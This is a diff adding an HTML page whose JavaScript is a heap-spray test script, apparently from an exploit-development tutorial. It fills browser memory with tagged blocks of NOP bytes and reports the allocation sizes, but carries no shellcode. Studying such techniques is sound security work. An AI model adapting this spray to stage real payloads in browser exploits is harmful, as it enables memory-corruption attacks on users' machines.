@@ -1,0 +1,41 @@
+
+<html>
+<body>
+<script language='javascript'>
+
+var myvar = "Stroschein";
+
+//\u0053\u0074\u0072\u006f\u0073\u0063\u0068\u0065\u0069\u006e
+var myvar2 = unescape('%u7453%u6f72%u6373%u6568%u6e69%u0033');
+document.write("Length: " + myvar2.length);
+
+// heap spray test script
+// corelanc0d3r
+// Don't forget to remove the backslashes
+tag = unescape('%u7453%u6f72%u6373%u6568%u6e69%u0032');
+
+chunk = '';
+chunksize = 0x1000;
+nr_of_chunks = 200;
+
+for ( counter = 0; counter < chunksize; counter++)
+{
+	chunk += unescape('%u\9090%u\9090');	//nops
+}
+
+document.write("size of NOPS at this point : " + chunk.length.toString() + "<br>");
+chunk = chunk.substring(0,chunksize - tag.length);
+document.write("size of NOPS after substring : " + chunk.length.toString() + "<br>");
+
+// create the array
+testarray = new Array();
+for ( counter = 0; counter < nr_of_chunks; counter++)
+{
+	testarray[counter] = tag + chunk;
+	document.write("Allocated " + (tag.length+chunk.length).toString() + " bytes <br>");
+}
+alert("Spray done")
+
+</script>
+</body>
+</html>
